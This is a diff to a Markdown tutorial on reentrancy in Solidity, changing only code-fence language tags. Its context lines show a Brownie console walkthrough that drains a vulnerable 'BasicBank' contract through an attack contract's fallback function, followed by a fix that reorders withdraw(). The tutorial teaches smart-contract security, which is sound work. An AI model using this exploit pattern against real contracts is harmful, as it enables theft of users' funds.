@@ -33,7 +33,7 @@ Does the attacker have 1 eth on their balance? Yes – because the balance has n
 Transfer 1 eth to a malicious contract and again until the attacker will drain all the funds stored on the contract.
 ## 📄 Example Of Vulnereable Contract
 This contract is designed to provide basic web3 banking services and includes vulnerabilities that are frequently encountered in other smart contracts.
-```
+```solidity
 //SPDX-License-Identifier: MIT
 pragma solidity 0.7.0;
 
@@ -92,7 +92,7 @@ Although there are many vulnerabilities in this smart contract, we should focus 
 ## 🕷 A Closer Look at the Attack Contract
 
 Let's start with importing BasicBank.sol file which is in the same directory. After that, I create new BasicBank object named target and use ```constructor()``` function for which learn target contract address. Arrive second step, at least one ether must be deposited to make a transaction on the target contract.So, I had called deposit() function from target contract and withdrew it. The only thing for coffe break, we must add ```fallback()``` function. Shortly, fallback function only works when external payment comes into contract. When external payment comes into attack contract from target, call withdraw function from target again and again until target balance's less than 1 ether. Thus, our attack contract will have withdrew all money in bank.
-```
+```solidity
 //SPDX-License-Identifier: MIT
 pragma solidity 0.7.0;
 
@@ -131,7 +131,7 @@ Compile contracts.
 ```
 brownie compile
 ```
-```
+```powershell
 INFO: Could not find files for the given pattern(s).
 Brownie v1.19.1 - Python development framework for Ethereum
 
@@ -150,7 +150,7 @@ Deploy *BasicBank* contract with **brownie console**.
 ```
 brownie console
 ```
-```
+```powershell
 >>> bank = accounts[0].deploy(BasicBank)
 Transaction sent: 0x3dff3c2bb305d4b3b511181572a2a898db562ea6bb90bbc46859b5bff3d4fed0
   Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
@@ -159,7 +159,7 @@ Transaction sent: 0x3dff3c2bb305d4b3b511181572a2a898db562ea6bb90bbc46859b5bff3d4
 ```
 
 Afterwards, I deposit money into my user account, just as customers of this bank do.
-```
+```powershell
 >>> bank.deposit({'from': accounts[0], 'value': 10e18})
 Transaction sent: 0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6
   Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
@@ -168,13 +168,13 @@ Transaction sent: 0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c
 <Transaction '0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6'>
 
 ```
-```
+```powershell
 >>> bank.getBalance(accounts[0])
 10000000000000000000
 ```
 The money has been entered into the bank. Why don't we attack?
 Firstly, deploy *Attack* contract and enter target contract address.
-```
+```powershell
 >>> reentracy = accounts[1].deploy(Attack, '0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87')
 Transaction sent: 0xd57f8472a3a7668108ae62f7d52a82180fb7a0ea664090bb2b42d06bf7a6a8c0
   Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
@@ -182,7 +182,7 @@ Transaction sent: 0xd57f8472a3a7668108ae62f7d52a82180fb7a0ea664090bb2b42d06bf7a6
   Attack deployed at: 0xe7CB1c67752cBb975a56815Af242ce2Ce63d3113
 ```
 And reentracy! We succesfully hacked this smart contract.
-```
+```powershell
 >>> reentracy.attack({'from': accounts[1], 'value':1e18})
 Transaction sent: 0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae2257923
   Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
@@ -192,7 +192,7 @@ Transaction sent: 0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae225
 >>> reentracy.balance()
 11000000000000000000
 ```
-```
+```powershell
 >>> bank.balance()
 0
 ```
@@ -200,7 +200,7 @@ Transaction sent: 0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae225
 
 As I mentioned in the analysis part, the order of transactions in the ```withdraw()``` function is constructed with a wrong point of view.What is more, when you use ```call()```, you should limit the gas fee.Therefore, if the transaction order is made like this way, the reentracy vulnerability will die out.
 
-```
+```solidity
 function withdraw(uint _amount) external payable {
         require(getBalance(msg.sender) >= _amount);
         userFunds[msg.sender] -= _amount;
